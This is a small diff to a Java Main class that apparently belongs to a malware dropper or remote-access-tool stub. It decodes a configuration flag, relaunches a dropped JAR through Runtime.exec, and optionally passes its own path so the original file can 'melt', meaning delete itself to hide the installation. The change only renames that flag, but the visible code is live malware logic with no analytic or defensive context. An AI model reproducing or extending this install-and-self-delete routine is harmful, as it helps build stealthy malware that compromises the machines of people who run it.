@@ -183,14 +183,14 @@ public class Main {
 			if (System.getProperty("os.name").toLowerCase().contains("win")) {
 				if (Boolean.parseBoolean(decode(keyArgs[2].trim()))) {
 					String mepath = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
-					Runtime.getRuntime().exec(new String[] { javapath, "-jar", file.getAbsolutePath(), "MELT", mepath });
+					Runtime.getRuntime().exec(new String[] { javapath, "-jar", file.getAbsolutePath(), "-melt", mepath });
 				} else {
 					Runtime.getRuntime().exec(new String[] { javapath, "-jar", file.getAbsolutePath() });
 				}
 			} else {
 				if (Boolean.parseBoolean(decode(keyArgs[2].trim()))) {
 					String mepath = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
-					Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath(), "MELT", mepath });
+					Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath(), "-melt", mepath });
 				} else {
 					Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath().replace("file:", "").replace(" ", "%20") });
 				}
